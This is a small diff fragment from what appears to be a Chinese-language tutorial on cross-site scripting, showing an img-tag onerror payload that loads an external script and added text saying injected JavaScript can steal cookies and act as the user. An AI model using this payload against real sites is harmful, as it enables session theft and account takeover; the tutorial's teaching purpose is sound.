@@ -174,5 +174,6 @@ xss几乎每个网站都存在，google、baidu、360等都存在。
 ```
 <img src=x onerror=appendChild(createElement('script')).src='js_url' />
 ```
-
+各种姿势，各种插，只要鞥运行我们的js就OK。那运行我们的js有什么用呢？
+Js可以干很多的事，可以获取cookies(对**http-only**没用)、控制用户的动作(发帖、私信什么的)等等。
 
